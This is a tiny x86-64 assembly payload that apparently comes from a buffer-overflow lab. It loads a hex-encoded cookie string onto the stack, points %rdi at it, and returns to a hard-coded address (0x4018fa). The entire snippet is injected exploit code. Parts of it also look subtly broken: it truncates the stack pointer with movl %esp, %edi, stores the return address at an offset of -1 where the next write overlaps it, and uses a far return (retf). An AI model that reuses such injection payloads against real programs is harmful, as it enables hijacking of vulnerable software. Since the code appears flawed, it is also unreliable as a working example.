# move cookie pointer into %rdi

movq $0x3539623939376661, %rax
movl %esp, %edi
movl $0x4018fa, -1(%rsp)
movq %rax, (%rsp)
movb $0, 8(%rsp)
retf
